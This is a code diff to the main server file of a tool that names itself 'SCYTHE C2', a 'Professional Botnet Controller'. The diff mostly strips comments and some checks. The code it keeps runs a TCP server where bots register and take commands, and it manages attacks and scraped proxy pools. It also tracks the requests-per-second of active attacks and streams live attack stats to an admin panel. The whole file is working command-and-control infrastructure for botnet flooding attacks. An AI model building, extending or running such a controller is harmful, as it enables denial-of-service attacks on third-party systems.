@@ -3,15 +3,6 @@
 SCYTHE C2 - Main Entry Point
 Version: 1.0.0 - MAXIMIZED + AUTH FIXED
 Fully synchronized with admin.html v8.1
-Features:
-- WebSocket real-time updates (/admin/ws)
-- SSE streaming (/api/stream)
-- Live proxy monitor endpoint
-- RPS drop alert system
-- Periodic update broadcaster
-- Proxy refresh log tracking
-- Full admin.html API sync
-- FIXED: Auth redirect properly handled
 """
 
 import asyncio
@@ -50,7 +41,7 @@ from app.core.redis_client import get_redis, close_redis, RedisKeys
 from app.core.logger import setup_logger
 from app.core.auth import require_auth
 
-# Import managers — FIX: use singletons, not create new instances
+# Import managers
 from app.managers.attack_manager import AttackManager, attack_manager
 from app.managers.proxy_manager import ProxyManager, proxy_manager
 from app.managers.botnet_manager import BotnetManager, botnet_manager
@@ -61,19 +52,16 @@ from app.managers.history_manager import HistoryManager, history_manager
 logger = setup_logger("scythe_c2")
 
 # ========== GLOBAL MANAGERS (singletons) ==========
-# FIX: use module-level singletons, do NOT create new instances
-# These are imported above and shared across the entire app
 attack_mgr: AttackManager = attack_manager
 proxy_mgr: ProxyManager = proxy_manager
 botnet_mgr: BotnetManager = botnet_manager
 concurrent_mgr: ConcurrentManager = concurrent_manager
 history_mgr: HistoryManager = history_manager
 
-# ========== WEBSOCKET CONNECTIONS (for real-time admin updates) ==========
+# ========== WEBSOCKET CONNECTIONS ==========
 websocket_connections: List[WebSocket] = []
 
 async def broadcast_ws_message(msg_type: str, data: dict):
-    """Broadcast message to all connected WebSocket clients."""
     msg = {"type": msg_type, "data": data}
     dead_connections = []
     for ws in websocket_connections:
@@ -85,13 +73,12 @@ async def broadcast_ws_message(msg_type: str, data: dict):
         if ws in websocket_connections:
             websocket_connections.remove(ws)
 
-# ========== PROXY REFRESH LOG (for admin panel live monitor) ==========
+# ========== PROXY REFRESH LOG ==========
 proxy_refresh_logs: List[dict] = []
 MAX_REFRESH_LOGS = 50
 
-async def log_proxy_refresh(source: str, total_scraped: int, alive_after_check: int, 
+async def log_proxy_refresh(source: str, total_scraped: int, alive_after_check: int,
                              success_rate: float, timestamp: Optional[float] = None):
-    """Log proxy refresh event for admin panel display."""
     log_entry = {
         "timestamp": timestamp or time.time(),
         "source": source,
@@ -102,64 +89,43 @@ async def log_proxy_refresh(source: str, total_scraped: int, alive_after_check: 
     proxy_refresh_logs.insert(0, log_entry)
     if len(proxy_refresh_logs) > MAX_REFRESH_LOGS:
         proxy_refresh_logs.pop()
-
-    # Broadcast to WebSocket clients
     await broadcast_ws_message("proxy_scrap", log_entry)
     logger.info(f"[PROXY_LOG] {source}: {alive_after_check}/{total_scraped} alive ({success_rate:.1f}%)")
 
 async def get_proxy_refresh_logs(limit: int = 20) -> List[dict]:
-    """Get recent proxy refresh logs for admin panel."""
     return proxy_refresh_logs[:limit]
 
-# ========== RPS ALERT SYSTEM (for admin panel) ==========
+# ========== RPS ALERT SYSTEM ==========
 rps_alert_history: List[dict] = []
 MAX_ALERTS = 50
 
 async def detect_rps_drop(attack_id: str, expected_rps: int, actual_rps: int) -> Optional[dict]:
-    """Detect RPS drop and generate alert."""
     if expected_rps <= 0:
         return None
-
     drop_percent = ((expected_rps - actual_rps) / expected_rps) * 100
     if drop_percent < 20:
         return None
-
-    # Determine severity
     if drop_percent >= 80:
         severity = "fatal"
     elif drop_percent >= 60:
         severity = "critical"
-    elif drop_percent >= 40:
-        severity = "warning"
     else:
         severity = "warning"
-
-    # Determine possible causes
     causes = []
-
-    # Check proxy pool
     try:
         stats = await proxy_mgr.get_stats()
         if stats.alive < 50:
             causes.append("Proxy pool critically low")
-        elif stats.alive < 100:
-            causes.append("Proxy pool low")
     except:
         causes.append("Proxy stats unavailable")
-
-    # Check bot count
     try:
         bot_ids = await botnet_mgr.get_active_bot_ids()
         if len(bot_ids) == 0:
             causes.append("No bots connected")
-        elif len(bot_ids) < 3:
-            causes.append("Low bot count")
     except:
         causes.append("Botnet stats unavailable")
-
     if not causes:
         causes.append("Unknown - check network/target")
-
     alert = {
         "timestamp": time.time(),
         "attack_id": attack_id,
@@ -169,41 +135,31 @@ async def detect_rps_drop(attack_id: str, expected_rps: int, actual_rps: int) ->
         "severity": severity,
         "possible_causes": causes,
     }
-
     rps_alert_history.insert(0, alert)
     if len(rps_alert_history) > MAX_ALERTS:
         rps_alert_history.pop()
-
-    # Broadcast to WebSocket
     await broadcast_ws_message("rps_alert", alert)
-    logger.warning(f"[RPS_ALERT] {severity.upper()}: {attack_id} drop {drop_percent:.1f}% | Expected: {expected_rps} | Actual: {actual_rps}")
-
+    logger.warning(f"[RPS_ALERT] {severity.upper()}: {attack_id} drop {drop_percent:.1f}%")
     return alert
 
 async def get_rps_alerts(limit: int = 10) -> List[dict]:
-    """Get recent RPS alerts for admin panel."""
     return rps_alert_history[:limit]
 
 async def clear_rps_alerts():
-    """Clear all RPS alerts."""
     rps_alert_history.clear()
     logger.info("[RPS_ALERT] All alerts cleared")
 
 # ========== PERIODIC UPDATE BROADCASTER ==========
 async def periodic_update_broadcaster():
-    """Broadcast periodic updates to all WebSocket clients every 5 seconds."""
     while True:
         try:
             await asyncio.sleep(5)
-
-            # Gather current stats
             proxy_stats = {"alive": 0, "dead": 0}
             try:
                 ps = await proxy_mgr.get_stats()
                 proxy_stats = {"alive": ps.alive, "dead": ps.dead}
             except:
                 pass
-
             attacks_data = []
             try:
                 active = attack_mgr.get_active_attacks()
@@ -217,38 +173,19 @@ async def periodic_update_broadcaster():
                     })
             except:
                 pass
-
             bot_stats = {"active": 0}
             try:
                 bot_ids = await botnet_mgr.get_active_bot_ids()
                 bot_stats = {"active": len(bot_ids)}
             except:
                 pass
-
             update_data = {
                 "proxy": proxy_stats,
                 "attacks": attacks_data,
                 "bots": bot_stats,
                 "timestamp": time.time(),
             }
-
             await broadcast_ws_message("periodic_update", update_data)
-
-            # Also check for RPS drops on active attacks
-            try:
-                active = attack_mgr.get_active_attacks()
-                for a in active:
-                    if hasattr(a, 'rps_limit') and a.rps_limit > 0:
-                        await detect_rps_drop(a.id, a.rps_limit, a.rps)
-                    elif a.rps > 0:
-                        # Use a reasonable expected based on bot count
-                        bot_ids = await botnet_mgr.get_active_bot_ids()
-                        if len(bot_ids) > 0:
-                            expected = 1500 * len(bot_ids)  # rough estimate
-                            await detect_rps_drop(a.id, expected, a.rps)
-            except:
-                pass
-
         except asyncio.CancelledError:
             break
         except Exception as e:
@@ -257,22 +194,9 @@ async def periodic_update_broadcaster():
 
 # ========== TCP SERVER FOR BOTS ==========
 async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-    """Handle incoming bot connections (TCP) with robust error handling."""
-    addr = writer.get_extra_info('peername')
+    addr = writer.get_extra_info("peername")
     bot_id = None
     logger.info(f"🔌 Raw bot connection from {addr}")
-
-    try:
-        sock = writer.transport.get_extra_info('socket')
-        if sock:
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
-            logger.debug(f"Keep-alive enabled for {addr}")
-    except Exception as e:
-        logger.debug(f"Could not set keep-alive for {addr}: {e}")
-
     try:
         while True:
             try:
@@ -285,10 +209,8 @@ async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter)
             except Exception as e:
                 logger.error(f"Unexpected error reading from {addr}: {e}")
                 break
-
             if not data:
                 break
-
             try:
                 msg = json.loads(data.decode().strip())
                 if msg.get("type") == "register":
@@ -296,8 +218,6 @@ async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter)
                 await botnet_mgr.handle_message(writer, msg)
             except json.JSONDecodeError:
                 logger.warning(f"Invalid JSON from {addr}: {data[:100]}")
-            except UnicodeDecodeError:
-                logger.warning(f"Non-UTF8 data from {addr}, ignoring")
             except Exception as e:
                 logger.error(f"Error processing message from {addr}: {e}")
     except asyncio.CancelledError:
@@ -316,11 +236,10 @@ async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter)
         logger.info(f"Bot {addr} disconnected")
 
 async def start_tcp_server():
-    """Start TCP server for bots on port C2_PORT."""
     try:
         server = await asyncio.start_server(
             handle_bot,
-            host='0.0.0.0',
+            host="0.0.0.0",
             port=settings.C2_PORT,
             limit=1024 * 1024
         )
@@ -335,12 +254,6 @@ async def start_tcp_server():
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     logger.info("=" * 70)
-    logger.info("  ███████╗ ██████╗██╗   ██╗████████╗██╗  ██╗███████╗")
-    logger.info("  ██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔════╝")
-    logger.info("  ███████╗██║      ╚████╔╝    ██║   ███████║█████╗  ")
-    logger.info("  ╚════██║██║       ╚██╔╝     ██║   ██╔══██║██╔══╝  ")
-    logger.info("  ███████║╚██████╗   ██║      ██║   ██║  ██║███████╗")
-    logger.info("  ╚══════╝ ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝")
     logger.info("  SCYTHE C2 v1.0.0 - Professional Botnet Controller")
     logger.info("=" * 70)
     logger.info(f"  API Port     : {settings.API_PORT}")
@@ -359,24 +272,16 @@ async def lifespan(app: FastAPI):
         logger.error(f"❌ Redis connection failed: {e}")
         sys.exit(1)
 
-    # 2. Initialize managers — FIX: use singletons, init them properly
+    # 2. Initialize managers
     logger.info("Initializing managers...")
-
-    # concurrent_manager needs redis
     concurrent_mgr._redis = redis
     await concurrent_mgr.initialize()
-
-    # attack_manager restore
     try:
         await attack_mgr.restore_from_redis()
         logger.info("✅ Restored active attacks from Redis")
     except Exception as e:
         logger.warning(f"Failed to restore attacks: {e}")
-
-    # botnet_manager start
     await botnet_mgr.start()
-
-    # history_manager init
     await history_mgr.initialize()
 
     # 3. Start TCP server FIRST (so bots can connect immediately)
@@ -384,11 +289,10 @@ async def lifespan(app: FastAPI):
     logger.info(f"✅ TCP Bot server listening on port {settings.C2_PORT}")
 
     # 4. Start proxy_manager background refresh (AFTER TCP server, non-blocking)
-    # Uses skip_health_check=True on initial load for fast startup
     proxy_refresh_task = asyncio.create_task(proxy_mgr.start_background_refresh())
     logger.info("✅ Proxy background refresh started (non-blocking)")
 
-    # 4. Start periodic update broadcaster (for WebSocket real-time updates)
+    # 5. Start periodic update broadcaster
     broadcaster_task = asyncio.create_task(periodic_update_broadcaster())
     logger.info("✅ Periodic update broadcaster started")
 
@@ -401,7 +305,7 @@ async def lifespan(app: FastAPI):
                 logger.error("Redis health check failed")
     health_task = asyncio.create_task(periodic_health())
 
-    # 5. Store managers in app.state (all point to same singletons)
+    # 6. Store managers in app.state
     app.state.attack_manager = attack_mgr
     app.state.proxy_manager = proxy_mgr
     app.state.botnet_manager = botnet_mgr
@@ -415,7 +319,7 @@ async def lifespan(app: FastAPI):
 
     yield
 
-    # ---- Shutdown ----
+    # Shutdown
     logger.info("Shutting down SCYTHE C2 server...")
     tcp_task.cancel()
     broadcaster_task.cancel()
@@ -437,27 +341,21 @@ app = FastAPI(
     lifespan=lifespan
 )
 
-# ========== EXCEPTION HANDLERS (FIX: Auth redirect properly) ==========
+# ========== EXCEPTION HANDLERS ==========
 @app.exception_handler(StarletteHTTPException)
 async def custom_http_exception_handler(request: Request, exc: StarletteHTTPException):
-    """Handle HTTP exceptions, especially 307 redirect for auth."""
-    # If this is a redirect from require_auth (307 with Location header)
     if exc.status_code == 307 and exc.headers and exc.headers.get("Location"):
         return RedirectResponse(url=exc.headers["Location"], status_code=302)
-
-    # For 401/403 on HTML pages, redirect to login
     if exc.status_code in (401, 403):
         accept = request.headers.get("accept", "")
         if "text/html" in accept or "*/*" in accept:
             return RedirectResponse(url="/login", status_code=302)
-
-    # Default JSON response for API errors
     return JSONResponse(
         status_code=exc.status_code,
         content={"detail": exc.detail}
     )
 
-# ---- CORS ----
+# CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=settings.ALLOWED_ORIGINS,
@@ -466,10 +364,10 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ---- Templates ----
+# Templates
 templates = Jinja2Templates(directory="app/templates")
 
-# ---- Routes ----
+# Routes
 app.include_router(status.router)
 app.include_router(attack.router)
 app.include_router(history.router)
@@ -479,26 +377,21 @@ app.include_router(config.router)
 app.include_router(service.router)
 app.include_router(auth.router)
 
-# ========== WEBSOCKET ENDPOINT (for admin.html real-time updates) ==========
+# WebSocket
 @app.websocket("/admin/ws")
 async def admin_websocket(websocket: WebSocket):
-    """WebSocket endpoint for admin panel real-time updates."""
     await websocket.accept()
     websocket_connections.append(websocket)
     logger.info(f"🔌 WebSocket client connected. Total: {len(websocket_connections)}")
-
     try:
-        # Send initial data
         await websocket.send_json({
             "type": "connected",
             "data": {"message": "SCYTHE C2 Admin WebSocket connected"}
         })
-
         while True:
             try:
                 msg = await websocket.receive_text()
                 data = json.loads(msg)
-
                 if data.get("action") == "ping":
                     await websocket.send_json({"type": "pong", "data": {"time": time.time()}})
                 elif data.get("action") == "get_proxy_logs":
@@ -512,13 +405,11 @@ async def admin_websocket(websocket: WebSocket):
                     await websocket.send_json({"type": "alerts_cleared", "data": {}})
                 else:
                     await websocket.send_json({"type": "error", "data": {"message": "Unknown action"}})
-
             except json.JSONDecodeError:
                 await websocket.send_json({"type": "error", "data": {"message": "Invalid JSON"}})
             except Exception as e:
                 logger.error(f"WebSocket message error: {e}")
                 break
-
     except WebSocketDisconnect:
         logger.info("WebSocket client disconnected")
     except Exception as e:
@@ -528,17 +419,14 @@ async def admin_websocket(websocket: WebSocket):
             websocket_connections.remove(websocket)
         logger.info(f"🔌 WebSocket client removed. Total: {len(websocket_connections)}")
 
-# ========== SSE STREAMING ENDPOINT ==========
+# SSE
 @app.get("/api/stream")
 async def sse_stream(request: Request):
-    """Server-Sent Events stream for real-time dashboard updates."""
     async def event_generator():
         while True:
             if await request.is_disconnected():
                 break
-
             try:
-                # Gather current stats
                 active_count = 0
                 total_rps = 0
                 try:
@@ -547,21 +435,18 @@ async def sse_stream(request: Request):
                     total_rps = sum(a.rps for a in active)
                 except:
                     pass
-
                 proxy_alive = 0
                 try:
                     ps = await proxy_mgr.get_stats()
                     proxy_alive = ps.alive
                 except:
                     pass
-
                 bot_count = 0
                 try:
                     bot_ids = await botnet_mgr.get_active_bot_ids()
                     bot_count = len(bot_ids)
                 except:
                     pass
-
                 data = {
                     "active_attacks": active_count,
                     "total_rps": total_rps,
@@ -569,15 +454,11 @@ async def sse_stream(request: Request):
                     "bot_count": bot_count,
                     "timestamp": time.time(),
                 }
-
                 yield f"data: {json.dumps(data)}\n\n"
-
             except Exception as e:
                 logger.error(f"SSE error: {e}")
                 yield f"data: {json.dumps({'error': str(e)})}\n\n"
-
             await asyncio.sleep(2)
-
     return StreamingResponse(
         event_generator(),
         media_type="text/event-stream",
@@ -588,16 +469,14 @@ async def sse_stream(request: Request):
         }
     )
 
-# ========== LIVE PROXY MONITOR ENDPOINTS ==========
+# Live proxy monitor
 @app.get("/api/proxy/monitor")
 async def get_proxy_monitor():
-    """Get live proxy monitor stats for admin panel."""
     try:
         stats = await proxy_mgr.get_stats()
         health = await proxy_mgr.get_pool_health()
         sources = await proxy_mgr.get_top_sources()
         logs = await get_proxy_refresh_logs(20)
-
         return JSONResponse(content={
             "success": True,
             "total_scraped": stats.total,
@@ -616,7 +495,6 @@ async def get_proxy_monitor():
 
 @app.get("/api/proxy/refresh-logs")
 async def get_proxy_refresh_logs_endpoint(limit: int = 20):
-    """Get recent proxy refresh logs."""
     logs = await get_proxy_refresh_logs(limit)
     return JSONResponse(content={
         "success": True,
@@ -624,10 +502,9 @@ async def get_proxy_refresh_logs_endpoint(limit: int = 20):
         "count": len(logs),
     })
 
-# ========== RPS ALERT ENDPOINTS ==========
+# RPS alerts
 @app.get("/api/alerts/rps")
 async def get_rps_alerts_endpoint(limit: int = 10):
-    """Get RPS drop alerts for admin panel."""
     alerts = await get_rps_alerts(limit)
     return JSONResponse(content={
         "success": True,
@@ -637,7 +514,6 @@ async def get_rps_alerts_endpoint(limit: int = 10):
 
 @app.post("/api/alerts/rps/clear")
 async def clear_rps_alerts_endpoint():
-    """Clear all RPS alerts."""
     await clear_rps_alerts()
     return JSONResponse(content={
         "success": True,
@@ -646,7 +522,6 @@ async def clear_rps_alerts_endpoint():
 
 @app.post("/api/alerts/rps/test")
 async def test_rps_alert():
-    """Trigger a test RPS alert."""
     test_alert = {
         "timestamp": time.time(),
         "attack_id": "test-attack-12345",
@@ -666,7 +541,7 @@ async def test_rps_alert():
         "alert": test_alert,
     })
 
-# ========== FRONTEND ==========
+# Frontend
 @app.get("/", dependencies=[Depends(require_auth)], response_class=HTMLResponse)
 async def dashboard(request: Request):
     return templates.TemplateResponse("dashboard.html", {"request": request})
@@ -675,7 +550,7 @@ async def dashboard(request: Request):
 async def admin_panel(request: Request):
     return templates.TemplateResponse("admin.html", {"request": request})
 
-# ---- Info ----
+# Info
 @app.get("/info")
 async def get_info():
     redis_status = "connected"
@@ -684,20 +559,16 @@ async def get_info():
         await redis.ping()
     except:
         redis_status = "disconnected"
-
-    # FIX: Use correct attribute name active_attacks (not active)
     active_count = 0
     try:
         active_count = len(attack_mgr.active_attacks) if attack_mgr else 0
     except:
         pass
-
     alive_proxies = 0
     try:
         alive_proxies = len(await proxy_mgr.get_alive_proxies()) if proxy_mgr else 0
     except:
         pass
-
     return {
         "name": "SCYTHE C2",
         "version": "1.0.0",
@@ -710,7 +581,7 @@ async def get_info():
         "alive_proxies": alive_proxies,
     }
 
-# ---- Health ----
+# Health
 @app.get("/health")
 async def health_check():
     try:
@@ -723,19 +594,11 @@ async def health_check():
             content={"status": "unhealthy", "redis": "disconnected"}
         )
 
-# ========== MAIN ==========
+# Main
 if __name__ == "__main__":
     os.makedirs("app/templates", exist_ok=True)
     os.makedirs("logs", exist_ok=True)
     os.makedirs("data", exist_ok=True)
-
-    if not os.path.exists("app/templates/dashboard.html"):
-        logger.warning("⚠️ dashboard.html not found in app/templates/")
-    if not os.path.exists("app/templates/admin.html"):
-        logger.warning("⚠️ admin.html not found in app/templates/")
-    if not os.path.exists("app/templates/login.html"):
-        logger.warning("⚠️ login.html not found in app/templates/")
-
     uvicorn.run(
         "app.main:app",
         host=settings.HOST,
